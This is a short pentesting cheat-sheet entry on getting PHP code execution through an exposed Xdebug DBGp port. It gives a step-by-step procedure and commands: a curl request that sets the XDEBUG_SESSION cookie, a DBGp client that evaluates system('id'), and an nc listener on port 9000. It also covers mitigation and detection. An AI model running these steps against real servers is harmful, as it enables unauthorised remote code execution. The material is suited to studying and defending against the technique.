---
topic: Xdebug — exposed DBGp and PHP execution
tags: [linux, php, xdebug, dbgp, rce]
---

# Xdebug — exposed DBGp and PHP execution

**English** | [🌐 Español](xdebug-dbgp-rce.md)

## Concept

Xdebug in remote mode accepts DBGp connections and evaluates PHP expressions. If port 9000 is reachable and the `XDEBUG_SESSION` cookie enables debugging, a client can run `system()` as the web user.

## When it applies

- The `Xdebug` header or `phpinfo` reveals the extension.
- Port 9000 is reachable from the attacker.
- `xdebug.remote_connect_back` or a fixed host allows the connection.

## Procedure

1. Confirm the version and remote mode.
2. Listen on 9000 and send `XDEBUG_SESSION=1`.
3. Implement the DBGp handshake and send `eval`.
4. Run `system()` and get a shell.

## Commands

```bash
curl -H 'Cookie: XDEBUG_SESSION=1' http://<HOST>/index.php
python3 xdebug_client.py  # eval: system('id')
nc -lvnp 9000
```

## Variants

- Use the browser plugin to start the session.
- Fixed `xdebug.remote_host` and an alternate port.
- Evaluate `file_get_contents` for reads.

## Limitations

- Xdebug may be in `develop` mode without connections.
- A firewall blocks 9000.
- Modern versions use `xdebug.mode=debug` and `client_host`.

## Mitigation

- Disable Xdebug in production.
- Block 9000 and avoid `remote_connect_back`.
- Separate the web user and review `php.ini`.

## Detection

- Outbound connections to port 9000.
- Requests with `XDEBUG_SESSION`.
- `system`, `exec` or `shell_exec` from PHP-FPM.

## References

- [Xdebug — remote debugging](https://xdebug.org/docs/remote)
- [0xdf — Olympus](https://0xdf.gitlab.io/2018/09/22/htb-olympus.html)
- [HackTricks — Xdebug](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html)
